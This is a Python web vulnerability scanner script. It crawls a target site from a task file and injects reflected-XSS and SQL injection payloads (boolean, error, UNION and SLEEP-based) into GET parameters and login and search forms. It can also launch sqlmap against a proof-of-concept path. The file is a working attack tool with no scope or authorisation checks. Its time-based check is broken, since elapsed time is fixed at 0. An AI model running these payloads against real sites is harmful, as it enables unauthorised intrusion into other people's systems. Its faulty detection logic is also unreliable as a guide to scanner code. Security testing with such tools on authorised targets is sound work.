#!/usr/bin/env python3
"""
Enhanced poc_runner_scanner.py
Saves HTML responses, runs simple XSS/SQLi checks, optionally runs sqlmap and
saves its stdout/stderr into outdir/sqlmap/.
Produces outdir/summary.json with findings.
"""
import argparse
import json
import os
import sys
import time
import hashlib
import html
import urllib.parse
import subprocess
from typing import List
import requests
from bs4 import BeautifulSoup

# ---- Config ----
DEFAULT_HEADERS = {"User-Agent": "poc-runner/1.0"}
TIMEOUT = 15
DELAY = 0.25

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>'
]

SQLI_PAYLOADS = {
    "boolean_true": "admin' OR '1'='1' -- ",
    "boolean_false": "admin' AND '1'='0' -- ",
    "error_based": "' AND (SELECT 1/0) -- ",
    "union_version": "admin' UNION SELECT 1,@@version,3 -- ",
    "time_based": "admin' OR IF(1=1,SLEEP(5),0) -- "
}

POST_TEMPLATES = [
    {"uname": "PAYLOAD", "pass": "test"},
    {"username": "PAYLOAD", "password": "test"},
    {"searchFor": "PAYLOAD"},
    {"message": "PAYLOAD"}
]

GET_PARAM_NAMES = ["searchFor", "uname", "q", "username", "message"]

SQLMAP_BIN = os.environ.get("SQLMAP_BIN", "sqlmap")  # change if needed

# ---- helpers ----
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

def safe_mkdir(p):
    os.makedirs(p, exist_ok=True)

def sha8(s: str):
    return hashlib.sha1(s.encode()).hexdigest()[:8]

def save_bytes(outdir: str, prefix: str, content: bytes) -> str:
    snippet = content[:200] if isinstance(content, bytes) else str(content)[:200]
    name = f"{prefix}_{sha8(snippet.decode('utf-8', errors='ignore') if isinstance(snippet, bytes) else str(snippet))}.html"
    path = os.path.join(outdir, name)
    with open(path, "wb") as fh:
        if isinstance(content, bytes):
            fh.write(content)
        else:
            fh.write(str(content).encode('utf-8', errors='replace'))
    return path

def find_error_signatures(text: str) -> List[str]:
    if not text:
        return []
    sigs = ["SQL syntax", "mysql_fetch", "Warning: mysql", "You have an error in your SQL syntax",
            "MySQL", "SQLSTATE", "syntax error", "odbc", "ORA-"]
    return [s for s in sigs if s.lower() in text.lower()]

def contains_reflection(text: str, payload: str) -> str:
    if not text:
        return ""
    if payload in text:
        return "raw"
    if html.escape(payload) in text:
        return "html_escaped"
    if urllib.parse.quote_plus(payload) in text:
        return "urlencoded"
    return ""

def get_links(base_url: str, html_text: str) -> List[str]:
    try:
        soup = BeautifulSoup(html_text or "", "html.parser")
    except Exception:
        return []
    links = set()
    for a in soup.find_all('a', href=True):
        href = a['href'].strip()
        if href.startswith('http://') or href.startswith('https://'):
            links.add(href)
        else:
            links.add(urllib.parse.urljoin(base_url, href))
    return sorted(links)

# ---- network actions ----
def fetch(url: str, session: requests.Session, params: dict=None, data: dict=None, headers: dict=None):
    try:
        if headers:
            session.headers.update(headers)
        if data is not None:
            r = session.post(url, data=data, timeout=TIMEOUT, allow_redirects=True)
        else:
            r = session.get(url, params=params, timeout=TIMEOUT, allow_redirects=True)
        time.sleep(DELAY)
        return r
    except Exception as e:
        eprint(f"[!] Request error for {url}: {e}")
        return None

# ---- sqlmap runner (saves output files) ----
def run_sqlmap_on_poc(target_url: str, method: str="GET", data: str=None, headers: dict=None, outdir: str=".", level: int=1, risk: int=1, timeout_s: int=180, extra_args: List[str]=None):
    safe_mkdir(outdir)
    sql_outdir = os.path.join(outdir, "sqlmap")
    safe_mkdir(sql_outdir)

    cmd = [SQLMAP_BIN, "-u", target_url, "--batch", f"--risk={risk}", f"--level={level}", "--random-agent"]
    if method.upper() == "POST" and data:
        cmd += ["--data", data]
    if headers:
        hdrs = "\\r\\n".join(f"{k}: {v}" for k, v in headers.items())
        cmd += ["--headers", hdrs]
    if extra_args:
        cmd += extra_args

    stdout_f = os.path.join(sql_outdir, "sqlmap_stdout.txt")
    stderr_f = os.path.join(sql_outdir, "sqlmap_stderr.txt")

    eprint(f"[*] Running sqlmap: {' '.join(cmd)}")
    try:
        with open(stdout_f, "w", encoding="utf-8") as outp, open(stderr_f, "w", encoding="utf-8") as errp:
            proc = subprocess.run(cmd, stdout=outp, stderr=errp, text=True, timeout=timeout_s)
        ret = proc.returncode
    except subprocess.TimeoutExpired:
        return {"status": "timeout", "stdout_file": stdout_f, "stderr_file": stderr_f}
    except FileNotFoundError:
        return {"status": "error", "error": "sqlmap not found", "cmd": cmd}
    except Exception as e:
        return {"status": "error", "error": str(e), "cmd": cmd}

    # heuristic read of stderr for vulnerability hints
    vulnerable_hint = False
    try:
        with open(stderr_f, "r", encoding="utf-8", errors="ignore") as fh:
            st = fh.read(8192).lower()
            if "is vulnerable" in st or "payload" in st or "parameter" in st:
                vulnerable_hint = True
    except Exception:
        pass

    return {"status": "done", "returncode": ret, "stdout_file": stdout_f, "stderr_file": stderr_f, "sqlmap_output_dir": sql_outdir, "vulnerable_hint": vulnerable_hint, "cmd": cmd}

# ---- scanning logic ----
def collect_endpoints(base_url: str, session: requests.Session, max_links: int=200):
    endpoints = [base_url]
    r = fetch(base_url, session)
    if r and r.text:
        links = get_links(base_url, r.text)
        for l in links:
            if l not in endpoints:
                endpoints.append(l)
            if len(endpoints) >= max_links:
                break
    return endpoints

def test_get_xss(session: requests.Session, url: str, param: str, payload: str, outdir: str):
    params = {param: payload}
    r = fetch(url, session, params=params)
    saved = ""
    refl = ""
    if r is not None:
        try:
            saved = save_bytes(outdir, f"get_{urllib.parse.urlparse(url).netloc}_{param}", r.content)
        except Exception:
            saved = ""
        refl = contains_reflection(r.text or "", payload)
    return {"url": url, "param": param, "method": "GET", "payload": payload, "status": getattr(r, "status_code", None), "size": len(r.content) if r is not None and r.content is not None else 0, "reflection": refl, "saved_file": saved}

def test_post_template(session: requests.Session, url: str, template: dict, payload: str, outdir: str):
    data = {}
    for k, v in template.items():
        if isinstance(v, str) and "PAYLOAD" in v:
            data[k] = v.replace("PAYLOAD", payload)
        elif v == "PAYLOAD":
            data[k] = payload
        else:
            data[k] = v
    r = fetch(url, session, data=data)
    saved = ""
    errs = []
    elapsed = None
    try:
        t0 = time.time()
        # fetch already does posting and sleeping, but we keep timing for heuristic
        if r is None:
            elapsed = None
        else:
            elapsed = round(0, 3)  # fetch timing not measured here precisely
    except Exception:
        elapsed = None
    if r is not None:
        try:
            saved = save_bytes(outdir, f"post_{urllib.parse.urlparse(url).netloc}_{'_'.join(data.keys())}", r.content)
        except Exception:
            saved = ""
        errs = find_error_signatures(r.text or "")
    return {"url": url, "params": list(data.keys()), "method": "POST", "payload": payload, "status": getattr(r, "status_code", None), "size": len(r.content) if r is not None and r.content is not None else 0, "time_s": elapsed, "error_signatures": errs, "saved_file": saved}

def run_scan(task: dict, outdir: str):
    safe_mkdir(outdir)
    session = requests.Session()
    session.headers.update(DEFAULT_HEADERS)

    base = task.get("target", {}).get("url") or task.get("base_url")
    if not base:
        raise ValueError("no base url in task payload")

    max_links = task.get("options", {}).get("max_links", 200)
    endpoints = task.get("endpoints") or collect_endpoints(base, session, max_links=max_links)
    endpoints = list(dict.fromkeys(endpoints))

    findings = []
    all_results = []

    for ep in endpoints:
        # GET XSS tests
        for param in GET_PARAM_NAMES:
            for payload in XSS_PAYLOADS:
                res = test_get_xss(session, ep, param, payload, outdir)
                all_results.append(res)
                if res.get("reflection"):
                    findings.append({"type": "xss_reflected", "detail": res})

        # POST templates for SQLi heuristics
        for template in POST_TEMPLATES:
            if any("PAYLOAD" in str(v) for v in template.values()):
                # boolean test
                r_true = test_post_template(session, ep, template, SQLI_PAYLOADS["boolean_true"], outdir)
                r_false = test_post_template(session, ep, template, SQLI_PAYLOADS["boolean_false"], outdir)
                all_results.extend([r_true, r_false])
                try:
                    diff = abs((r_true.get("size") or 0) - (r_false.get("size") or 0))
                except Exception:
                    diff = None
                if diff and diff > 40:
                    findings.append({"type": "sqli_boolean", "detail": {"true": r_true, "false": r_false, "diff": diff}})

            # error-based
            r_err = test_post_template(session, ep, template, SQLI_PAYLOADS["error_based"], outdir)
            all_results.append(r_err)
            if r_err.get("error_signatures"):
                findings.append({"type": "sqli_error", "detail": r_err})

            # union heuristic
            r_union = test_post_template(session, ep, template, SQLI_PAYLOADS["union_version"], outdir)
            all_results.append(r_union)
            try:
                if r_union.get("saved_file"):
                    with open(r_union["saved_file"], "rb") as fh:
                        txt = fh.read().decode("utf-8", errors="ignore")
                    if "mysql" in txt.lower() or "@@version" in txt.lower():
                        findings.append({"type": "sqli_union", "detail": r_union})
            except Exception:
                pass

            # time-based
            r_time = test_post_template(session, ep, template, SQLI_PAYLOADS["time_based"], outdir)
            all_results.append(r_time)
            try:
                if isinstance(r_time.get("time_s"), (int, float)) and r_time.get("time_s") >= 4.5:
                    findings.append({"type": "sqli_time", "detail": r_time})
            except Exception:
                pass

    # optionally run sqlmap using the provided POC (if any)
    options = task.get("options", {})
    if options.get("use_sqlmap"):
        poc = task.get("finding", {}).get("poc", {})
        poc_method = poc.get("method", "GET")
        poc_path = poc.get("path", "")
        target_url = urllib.parse.urljoin(base, poc_path)
        poc_body = None
        poc_headers = poc.get("headers")
        if poc_method.upper() == "POST" and isinstance(poc.get("body"), dict):
            poc_body = urllib.parse.urlencode(poc.get("body"))
        level = int(options.get("sqlmap_level", 1))
        risk = int(options.get("sqlmap_risk", 1))
        timeout_s = int(options.get("sqlmap_timeout", options.get("timeout", 180)))
        extra_args = options.get("sqlmap_extra_args") if isinstance(options.get("sqlmap_extra_args"), list) else None

        sqlmap_summary = run_sqlmap_on_poc(target_url, method=poc_method, data=poc_body, headers=poc_headers, outdir=outdir, level=level, risk=risk, timeout_s=timeout_s, extra_args=extra_args)
        all_results.append({"sqlmap": sqlmap_summary})
        if sqlmap_summary.get("vulnerable_hint"):
            findings.append({"type": "sqlmap_detected", "detail": sqlmap_summary})

    summary = {
        "task_id": task.get("task_id"),
        "base_url": base,
        "collected_endpoints": endpoints,
        "scan_time": time.time(),
        "results_count": len(all_results),
        "findings_count": len(findings),
        "findings": findings,
        "results": all_results
    }

    summary_path = os.path.join(outdir, "summary.json")
    with open(summary_path, "w", encoding="utf-8") as sf:
        json.dump(summary, sf, indent=2, ensure_ascii=False)

    return summary_path, summary

# ---- CLI ----
def main():
    parser = argparse.ArgumentParser(description="poc_runner_scanner (enhanced)")
    parser.add_argument("--payload", required=True, help="path to payload JSON (task)")
    parser.add_argument("--outdir", required=True, help="output directory to save HTML and summary")
    args = parser.parse_args()

    payload_path = args.payload
    outdir = args.outdir
    safe_mkdir(outdir)

    if not os.path.exists(payload_path):
        eprint("[!] payload file not found:", payload_path)
        sys.exit(2)

    try:
        with open(payload_path, "r", encoding="utf-8") as pf:
            task = json.load(pf)
    except Exception as e:
        eprint("[!] failed to read payload JSON:", e)
        sys.exit(3)

    if not (task.get("target", {}).get("url") or task.get("base_url")):
        eprint("[!] payload JSON missing 'target.url' or 'base_url'")
        sys.exit(3)

    eprint("[*] Starting scan for task_id:", task.get("task_id"))
    try:
        summary_path, summary = run_scan(task, outdir)
        eprint("[*] Scan finished, summary saved to", summary_path)
        print(json.dumps({"status": "ok", "summary": summary}, ensure_ascii=False))
        sys.exit(0)
    except Exception as e:
        eprint("[!] fatal error during scan:", str(e))
        sys.exit(4)

if __name__ == "__main__":
    main()
